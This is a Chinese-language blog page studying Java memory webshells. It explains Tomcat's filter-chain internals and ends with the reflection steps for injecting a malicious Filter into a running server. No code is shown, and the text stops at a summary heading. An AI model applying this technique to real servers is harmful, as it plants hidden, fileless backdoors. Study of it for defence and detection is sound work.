<!DOCTYPE html>
<html lang="zh-CN">

    
        <script src="/js/custom/love.min.js"></script>
    


<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Ko1sh1">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2022/03/08/memshell内存马/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="代码同步在了 https:&#x2F;&#x2F;github.com&#x2F;Ko1sh1&#x2F;StudyMem">
<meta property="og:type" content="article">
<meta property="og:title" content="java 内存马学习">
<meta property="og:url" content="http://example.com/2022/03/08/Memshell%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="代码同步在了 https:&#x2F;&#x2F;github.com&#x2F;Ko1sh1&#x2F;StudyMem">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="r:\notes\java\pic\1.png">
<meta property="og:image" content="r:\notes\java\pic\1623383074795-16654925598902.png">
<meta property="og:image" content="r:\notes\java\pic\image-20210330212301006.png">
<meta property="og:image" content="r:\notes\java\pic\1623412713625.png">
<meta property="og:image" content="r:\notes\java\pic\image-20221011212148052.png">
<meta property="og:image" content="r:\notes\java\pic\1623553440934.png">
<meta property="og:image" content="r:\notes\java\pic\1623566822352.png">
<meta property="og:image" content="r:\notes\java\pic\1623566974104.png">
<meta property="og:image" content="r:\notes\java\pic\image-20210331212905616.png">
<meta property="og:image" content="r:\notes\java\pic\1-16673128653255.png">
<meta property="og:image" content="r:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70.png">
<meta property="og:image" content="r:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-16673738253923.png">
<meta property="og:image" content="r:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-16673738718869.png">
<meta property="og:image" content="r:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737390543912.png">
<meta property="og:image" content="r:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737397584915.png">
<meta property="og:image" content="r:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737399110518.png">
<meta property="og:image" content="r:\notes\java\pic\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737404687621.png">
<meta property="og:image" content="r:\notes\java\pic\1623578410672.png">
<meta property="og:image" content="r:\notes\java\pic\1623640456652.png">
<meta property="og:image" content="r:\notes\java\pic\2804790-20220428003041172-926221891.png">
<meta property="og:image" content="r:\notes\java\pic\image-20221111205039773.png">
<meta property="og:image" content="r:\notes\java\pic\1623645442719.jpg">
<meta property="og:image" content="r:\notes\java\pic\1623648233517.png">
<meta property="og:image" content="r:\notes\java\pic\20210614163630.png">
<meta property="og:image" content="r:\notes\java\pic\20210614164445.png">
<meta property="article:published_time" content="2022-03-08T02:47:54.000Z">
<meta property="article:modified_time" content="2024-03-11T12:22:34.114Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="技巧">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="r:\notes\java\pic\1.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
    <meta name="theme-color" content="#FFA07A">
    <link rel="shortcut icon" href="/images/avatar.jpg">
    <!--- Page Info-->
    
    <title>
        
            java 内存马学习 -
        
        Ko1sh1&#39;s Blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    
        
            
    
            
    
            
                
                    <style> .home-banner-container .content div:nth-child(2) { justify-content: center !important;  } .home-banner-container .content div:nth-child(2) div:first-child { display: none !important; } </style>
                
    
            
                
                    <script data-swup-reload-script src='/js/custom/jquery.min.js'></script>
                
    
            
                
                    <script data-swup-reload-script src='/js/custom/text.js'></script>
                
    
            
                
                    <link rel='stylesheet' href='/css/mouse.css'>
                
    

    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    
    
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    
    
        <link href="/fonts/fonts.css" rel="stylesheet">
    


    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFA07A","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"english":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/b.jpg","dark":"/images/b.jpg"},"title":"Ko1sh1's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FF7569","dark":"#FF7569"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ko1sh1","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null,"qq":"/images/qq.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"雨に濡れた空気","artist":"春野杉卉","url":"/musics/雨に濡れた空気.mp3","cover":"/images/雨に濡れた空気.jpg"},{"name":"悋気","artist":"iwamizu","url":"/musics/悋気.mp3","cover":"/images/悋気.jpg"},{"name":"天空之城","artist":"StudioEIM","url":"/musics/天空之城.mp3","cover":"/images/天空之城.jpg"},{"name":"星茶会","artist":"灰澈","url":"/musics/星茶会.mp3","cover":"/images/星茶会.jpg"},{"name":"Talking to the Moon","artist":"MT1990","url":"/musics/Talking to the Moon.mp3","cover":"/images/Talking to the Moon.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":true,"color":{"left":"#87CEEB","right":"#FFB6C1","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Photos":{"path":"/masonry","icon":"fa-regular fa-image"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/5 17:00:00"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>



    
        <script src="/js/custom/love.min.js"></script>
    


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container px-6 md:px-12">

    <div class="navbar-content ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Ko1sh1&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    归档
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories"
                                        >
                                    <i class="fa-regular fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-user fa-fw"></i>
                                    关于
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a href="/about">
                                                    ME
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a href="/links/">
                                                    师傅们
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                归档
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-About"
                        >
                            <span>
                                关于
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/about">ME</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           href="/links/">师傅们</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/tags"
                        >
                            <span>Tags</span>
                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/masonry"
                        >
                            <span>Photos</span>
                            <i class="fa-regular fa-image fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    
    
        <script src="/js/custom/love.min.js"></script>
    


<div class="post-page-container flex relative justify-between box-border w-full h-full">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                
                
                <img src="/images/blog3.jpg" alt="java 内存马学习" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
                
                <div class="w-full flex items-center absolute bottom-0 justify-start">
                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">java 内存马学习</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/avatar.jpg">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Ko1sh1</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2022-03-08 10:47:54</span>
        <span class="mobile">2022-03-08 10:47:54</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-03-11 20:22:34</span>
            <span class="mobile">2024-03-11 20:22:34</span>
            <span class="hover-info">更新</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/java/">java</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%8A%80%E5%B7%A7/">技巧</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>20.7k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>93 分钟</span>
        </span>
    
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h1 id="内存马"><a href="#内存马" class="headerlink" title="&#96;&#96;内存马"></a>&#96;&#96;内存马</h1><blockquote>
<p>参考:</p>
<ul>
<li><p><a class="link"   target="_blank" rel="noopener" href="https://su18.org/post/memory-shell/" >https://su18.org/post/memory-shell/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p><a class="link"   target="_blank" rel="noopener" href="https://su18.org/post/memory-shell-2/" >https://su18.org/post/memory-shell-2/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p><a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1529" >Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
</blockquote>
<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><strong>目前安全行业主要讨论的内存马主要分为以下几种方式：</strong></p>
<blockquote>
<ul>
<li>动态注册 servlet&#x2F;filter&#x2F;listener（使用 servlet-api 的具体实现）</li>
<li>动态注册 interceptor&#x2F;controller（使用框架如 spring&#x2F;struts2）</li>
<li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如 Tomcat 的 Pipeline &amp; Valve，Grizzly 的 FilterChain &amp; Filter 等等）</li>
<li>使用 java agent 技术写入字节码</li>
</ul>
</blockquote>
<h3 id="Servlet-API-提供的动态注册机制"><a href="#Servlet-API-提供的动态注册机制" class="headerlink" title="Servlet API 提供的动态注册机制"></a>Servlet API 提供的动态注册机制</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1.png"
                      alt="1"
                ></p>
<blockquote>
<p><code>Servlet</code>、<code>Listener</code>、<code>Filter</code> 由 <code>javax.servlet.ServletContext</code> 去加载，无论是使用 xml 配置文件还是使用 Annotation 注解配置，均由 Web 容器进行初始化，读取其中的配置属性，然后向容器中进行注册。</p>
<p><code>Servlet</code> 3.0 <code>API</code> 允许使 <code>ServletContext</code> 用动态进行注册，在 Web 容器初始化的时候（即建立<code>ServletContext</code> 对象的时候）进行动态注册。可以看到 <code>ServletContext</code> 提供了 add*&#x2F;create* 方法来实现动态注册的功能。</p>
</blockquote>
<blockquote>
<ul>
<li>Servlet ：在用户请求路径与处理类映射之处，添加一个指定路径的指定处理类；</li>
<li>Filter：在用户处理类之前的，用来对请求进行额外处理提供额外功能的类；</li>
<li>Listener：在 Filter 之外的监听进程。</li>
</ul>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623383074795-16654925598902.png"
                      alt="1623383074795"
                ></p>
<h2 id="二、Filter-内存马原理分析"><a href="#二、Filter-内存马原理分析" class="headerlink" title="二、Filter 内存马原理分析"></a>二、Filter 内存马原理分析</h2><p><a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1529" >Tomcat 内存马学习(一)：Filter型 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（Filter流程写的相对比较清楚，讲的挺细）</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/" >查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/" >Tomcat-Filter型内存马 - Longlone’s Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="知识点归纳"><a href="#知识点归纳" class="headerlink" title="知识点归纳"></a>知识点归纳</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\image-20210330212301006.png"
                      alt="image-20210330212301006"
                ></p>
<blockquote>
<p>Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</p>
</blockquote>
<p>通常情况下，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 使用 ServletContext 的 addFilter/createFilter 方法注册；</span><br><span class="line">2. 使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册（将会在 Listener 中进行描述）；</span><br><span class="line">3. 使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态，后面会描述）。</span><br></pre></td></tr></table></figure></div>

<p>本节只讨论使用 <code>ServletContext</code> 添加 Filter 内存马的方法。首先来看一下 <code>createFilter</code> 方法，按照注释，这个类用来在调用 <code>addFilter</code> 向 <code>ServletContext</code> 实例化一个指定的 Filter 类。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623412713625.png"
                      alt="1623412713625"
                ></p>
<p>阅读上面的说明，这个类还约定了一个事情，那就是如果这个 <code>ServletContext</code> 传递给 <code>ServletContextListener</code> 的 <code>ServletContextListener.contextInitialized</code> 方法，该方法既未在 <code>web.xml</code> 或 <code>web-fragment.xml</code> 中声明，也未使用 <code>javax.servlet.annotation.WebListener</code> 进行注释，则会抛出 <code>UnsupportedOperationException</code> 异常，这个约定其实是非常重要的一点。</p>
<p>接下来看 <code>addFilter</code> 方法，<code>ServletContext</code> 中有三个重载方法，分别接收字符串类型的 <code>filterName</code> 以及 Filter 对象&#x2F;<code>className</code> 字符串&#x2F;Filter 子类的 Class 对象，提供不同场景下添加 filter 的功能，这些方法均返回 <code>FilterRegistration.Dynamic</code> 实际上就是 <code>FilterRegistration</code> 对象。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\image-20221011212148052.png"
                      alt="image-20221011212148052"
                ></p>
<p><code>addFilter</code> 方法实际上就是动态添加 filter 的最核心和关键的方法，但是这个类中同样约定了 <code>UnsupportedOperationException</code> 异常。</p>
<p>由于 <code>Servlet</code> <code>API</code> 只是提供接口定义，具体的实现还要看具体的容器，那我们首先以 Tomcat 7.0.96 为例，看一下具体的实现细节。相关实现方法在 <code>org.apache.catalina.core.ApplicationContext#addFilter</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623553440934.png"
                      alt="1623553440934"
                ></p>
<p>可以看到，这个方法创建了一个 <code>FilterDef</code> 对象，将 <code>filterName</code>、<code>filterClass</code>、filter 对象初始化进去，使用 <code>StandardContext</code> 的 <code>addFilterDef</code> 方法将创建的 <code>FilterDef</code> 储存在了 <code>StandardContext</code> 中的一个 <code>Hashmap filterDefs</code> 中，然后 new 了一个 <code>ApplicationFilterRegistration</code> 对象并且返回，并没有将这个 Filter 放到 <code>FilterChain</code> 中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。</p>
<p>这时我们肯定要想，能不能直接操纵 <code>FilterChain</code> 呢？<code>FilterChain</code> 在 Tomcat 中的实现是 <code>org.apache.catalina.core.ApplicationFilterChain</code>，这个类提供了一个 <code>addFilter</code> 方法添加 Filter，这个方法接受一个 <code>ApplicationFilterConfig</code> 对象，将其放在 <code>this.filters</code> 中。答案是可以，但是没用，因为对于每次请求需要执行的 <code>FilterChain</code> 都是动态取得的。</p>
<blockquote>
<p>那Tomcat 是如何处理一次请求对应的 <code>FilterChain</code> 的呢？在 <code>ApplicationFilterFactory</code> 的 <code>createFilterChain</code> 方法中，可以看到流程如下：</p>
<ul>
<li>在 context 中获取 <code>filterMaps</code>，并遍历匹配 url 地址和请求是否匹配；</li>
<li>如果匹配则在 context 中根据 <code>filterMaps</code> 中的 <code>filterName</code> 查找对应的 <code>filterConfig</code>；</li>
<li>如果获取到 filterConfig，则将其加入到 filterChain 中</li>
<li>后续将会循环 filterChain 中的全部 filterConfig，通过 <code>getFilter</code> 方法获取 Filter 并执行 Filter 的 <code>doFilter</code> 方法。</li>
</ul>
<p>通过上述流程可以知道，每次请求的 <code>FilterChain</code> 是动态匹配获取和生成的，如果想添加一个 Filter ，需要在 <code>StandardContext</code> 中 <code>filterMaps</code> 中添加 <code>FilterMap</code>，在 <code>filterConfigs</code> 中添加 <code>ApplicationFilterConfig</code>。这样程序创建时就可以找到添加的 Filter 了。</p>
</blockquote>
<p>在之前的 <code>ApplicationContext</code> 的 <code>addFilter</code> 中将 filter 初始化存储在了 <code>StandardContext</code> 的 <code>filterDefs</code> 中，那后面又是如何添加在其他参数中的呢？</p>
<p>在 <code>StandardContext</code> 的 <code>filterStart</code> 方法中生成了 <code>filterConfigs</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623566822352.png"
                      alt="1623566822352"
                ></p>
<p>在 <code>ApplicationFilterRegistration</code> 的 <code>addMappingForUrlPatterns</code> 中生成了 <code>filterMaps</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623566974104.png"
                      alt="1623566974104"
                ></p>
<p>而这两者的信息都是从 <code>filterDefs</code> 中的对象获取的。</p>
<p><strong>在应用程序中动态的添加一个 filter 的思路：</strong></p>
<blockquote>
<ul>
<li><p>调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要<strong>反射修改应用程序的运行状态</strong>，加完之后再改回来；</p>
</li>
<li><p>调用 StandardContext 的 filterStart 方法生成 filterConfigs；</p>
</li>
<li><p>调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；</p>
</li>
<li><p>为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，<strong>也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位</strong>。</p>
</li>
</ul>
</blockquote>
<p><strong>总结一下</strong></p>
<p>过程中遇到的类</p>
